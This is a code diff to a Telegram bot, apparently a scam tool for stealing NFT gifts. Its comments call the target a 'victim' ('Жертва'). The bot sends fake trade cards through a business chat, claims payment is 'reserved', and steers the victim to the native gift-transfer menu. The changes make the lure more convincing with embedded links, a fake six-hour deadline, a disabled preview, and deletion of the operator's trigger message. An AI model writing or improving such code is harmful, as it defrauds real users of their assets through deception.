@@ -4,6 +4,7 @@ import uuid
 import asyncio
 import logging
 import sys
+import time
 from aiogram import Bot, Dispatcher, F, Router
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
@@ -44,7 +45,10 @@ def parse_price(text: str):
     m = PRICE_RE.search(text)
     if not m: return None
     amount, unit = m.group(1), m.group(2).lower()
-    return f"{amount} Gram" if unit in ("gram", "грам", "grams") else f"{amount} Stars"
+    # Возвращаем кортеж: (сумма, валюта)
+    if unit in ("gram", "грам", "grams"):
+        return (amount, "Gram")
+    return (amount, "Stars")
 
 # ==========================================
 # ЛИЧКА БОТА (Создание оффера)
@@ -72,9 +76,9 @@ async def cmd_buy(msg: Message):
     price_text = " ".join(parts[1:-1]) if target_user != "unknown" else " ".join(parts[1:])
 
     nft = parse_nft(url)
-    price = parse_price(price_text)
+    price_data = parse_price(price_text)
 
-    if not nft or not price:
+    if not nft or not price_data:
         await msg.reply("❌ Не понял ссылку или цену.")
         return
 
@@ -83,22 +87,24 @@ async def cmd_buy(msg: Message):
     OFFERS[oid] = {
         "nft_name": nft["name"],
         "nft_slug": nft["slug"],
-        "price": price,
+        "price_amount": price_data[0],
+        "price_currency": price_data[1],
         "buyer": msg.from_user.username or "buyer",
-        "target_user": target_user
+        "target_user": target_user,
+        "expires": int(time.time()) + 6*3600 # Время истечения (6 часов)
     }
 
     await msg.reply(
         f"✅ <b>Оффер создан!</b>\n\n"
         f"Подарок: {nft['name']}\n"
-        f"Цена: {price}\n"
+        f"Цена: {price_data[0]} {price_data[1]}\n"
         f"Жертва: {target_user}\n\n"
         f"Код: <code>{oid}</code>\n"
         f"Отправь его в чат с жертвой."
     )
 
 # ==========================================
-# BUSINESS-ЧАТ (Отправка красивой карточки)
+# BUSINESS-ЧАТ (Отправка карточки)
 # ==========================================
 @router.business_message(F.text)
 async def handle_business_message(msg: Message):
@@ -114,19 +120,24 @@ async def handle_business_message(msg: Message):
     conn_id = msg.business_connection_id
     if not conn_id: return
 
+    # Формируем цену: если Stars, добавляем эмодзи, если Gram - ничего
+    if offer["price_currency"] == "Stars":
+        price_str = f"{offer['price_amount']} ⭐️"
+    else:
+        price_str = f"{offer['price_amount']} Gram"
+
     target_user = msg.from_user.username or "buyer"
     
-    # МАСКИРУЕМ ССЫЛКУ: Теперь вместо голой ссылки пишем красивый текст "Mirage Lamp #73768"
-    # Ссылка всё еще ведет на t.me/nft/..., но выглядит как название подарка.
-    # Текст оффера идет после ссылки, чтобы Telegram подтянул превью вверх, а текст оказался внизу.
-    
+    # ВСТРАИВАЕМ ССЫЛКУ В ТЕКСТ (вместо голого URL)
+    # Ссылка будет выглядеть как текст, но кликаться.
+    nft_link = f'<a href="https://t.me/nft/{offer["nft_slug"]}">{offer["nft_name"]}</a>'
+
     card_text = (
-        f'<a href="https://t.me/nft/{offer["nft_slug"]}">{offer["nft_name"]}</a>\n\n'
-        f"🎁 Подарок: <b>{offer['nft_name']}</b> успешно продан!\n\n"
-        f"Передайте подарок покупателю для зачисления <b>{offer['price']}</b>."
+        f"Пользователь <b>{target_user}</b> предлагает обменять ваш {nft_link} на <b>{price_str}</b>.\n\n"
+        f"Вы согласны принять предложение?\n\n"
+        f"Предложение действует ещё <b>6ч 0м</b>."
     )
 
-    # Кнопки: "Отклонить" и "Принять"
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="Отклонить", callback_data=f"reject:{oid}"),
          InlineKeyboardButton(text="Принять", callback_data=f"accept1:{oid}")]
@@ -138,7 +149,7 @@ async def handle_business_message(msg: Message):
             text=card_text, 
             business_connection_id=conn_id,
             reply_markup=kb, 
-            disable_web_page_preview=False
+            disable_web_page_preview=True # ВЫКЛЮЧАЕМ превью, чтобы карточка не лезла в текст
         )
         await asyncio.sleep(0.5)
         try: await bot.delete_message(chat_id=msg.chat.id, message_id=msg.message_id)
@@ -149,16 +160,20 @@ async def handle_business_message(msg: Message):
 # ==========================================
 # ЛОГИКА КНОПОК
 # ==========================================
-
-# 1. Нажатие на "Принять" (выдает инструкцию)
 @router.callback_query(F.data.startswith("accept1:"))
 async def on_accept1(cb: CallbackQuery):
     oid = cb.data.split(":", 1)[1]
     offer = OFFERS.get(oid)
     if not offer: return
     
+    # Форматируем цену для инструкции
+    if offer["price_currency"] == "Stars":
+        price_str = f"{offer['price_amount']} ⭐️"
+    else:
+        price_str = f"{offer['price_amount']} Gram"
+
     text = (
-        f"<b>Сумма {offer['price']} зарезервирована.</b>\n\n"
+        f"<b>Сумма {price_str} зарезервирована.</b>\n\n"
         f"Чтобы завершить сделку:\n"
         f"1. Ознакомьтесь с инструкцией ниже.\n"
         f"2. Нажмите «Передать NFT»."
@@ -171,15 +186,10 @@ async def on_accept1(cb: CallbackQuery):
     await cb.message.edit_text(text=text, reply_markup=kb)
     await cb.answer()
 
-# 2. Нажатие на "Передать NFT" (выдает нативное меню передачи)
 @router.callback_query(F.data.startswith("accept2:"))
 async def on_accept2(cb: CallbackQuery):
     oid = cb.data.split(":", 1)[1]
     offer = OFFERS.get(oid)
-    
-    # ИСПОЛЬЗУЕМ НАТИВНЫЙ ПРОТОКОЛ tg:// ДЛЯ ОТКРЫТИЯ МЕНЮ ПЕРЕДАЧИ
-    # Ссылка t.me/nft/...?transfer не работает, нужен tg://send_gift
-    # Однако, чтобы не сломать кнопку, если tg:// не сработает, оставляем fallback на обычную ссылку.
     
     native_transfer_url = f"tg://send_gift?slug={offer['nft_slug']}"
     
